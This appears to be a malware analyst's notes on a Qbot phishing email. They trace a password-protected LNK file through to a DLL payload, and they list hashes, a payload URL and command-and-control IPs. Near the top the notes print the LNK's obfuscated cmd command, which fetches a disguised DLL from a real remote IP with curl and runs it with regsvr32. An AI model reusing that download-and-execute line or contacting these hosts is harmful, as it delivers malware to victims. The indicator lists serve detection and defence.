@@ -1,0 +1,53 @@
+Qbot | 01-07-2022 | Client email
+
+[+] Permission_995334.lnk dropped
+
+[+] Password abc123 > lnk
+  // Inspect lnk: %windir%\System32\cmd.exe /c set r1=regsv&& set cu=cur&&call %windir%\system32\%cu%l -s -o %temp%\manyACome.png http://94.140.112.5/theyOne.jpg&&call %windir%\system32\%r1%r32 %temp%\manyACome.png
+
+[+] payload: http://94.140.112.5/theyOne.jpg
+  // File: theyOne.jpg
+
+[+] rundll32.exe theyOne.jpg DLLResgisterServer
+  // File siganature: info Power Save Systems s.r.o.
+
+************************************************************************
+
+Stage 1 Observed Email Indicators of Compromise (IOCs):
+Malicious File(s):
+File Name: Permission_995334.html
+MD5: 3791bbb64894a767f4cba16ea0d40d60
+SHA256: 1be246b2dfad9b54ed3c9cabe271d74f813df3c9405e69bb1ac0ac1c475669b6
+File Size: 6394 bytes (6K)
+
+Stage 2 Discovered Indicators of Compromise (IOCs):
+Malicious File(s):
+File Name: Permission_995334.zip
+MD5: b2e38f7a1c2408bf52f83114504dc661
+SHA256: c4b493f6e20bd13d4f721669f18f85ab0896713a1b7346bed854ccd8247a7322
+File Size: 1,402
+
+File Name: Permission_995334.lnk
+MD5: 83cd1c3f487bcce83de40d2686292b24
+SHA256: 53c882e838f1e406214f846b3b6575332c0c3dba6d7851b6e6346cbe9e84db8f
+File Size: 2861 bytes (2K)
+
+Payload URL(s):
+hXXp://94[.]140[.]112[.]5/theyOne[.]jpg
+
+Payload IP(s):
+94.140.112.5
+
+Command & Control URL(s):
+hXXp://37[.]34[.]253[.]219:443
+hXXp://113[.]53[.]152[.]223:443
+hXXp://24[.]178[.]196[.]85:2222
+hXXp://81[.]250[.]191[.]235:2222
+hXXp://138[.]186[.]28[.]110:443
+
+Command & Control IP(s):
+24.178.196.85
+113.53.152.223
+138.186.28.110
+81.250.191.235
+37.34.253.219
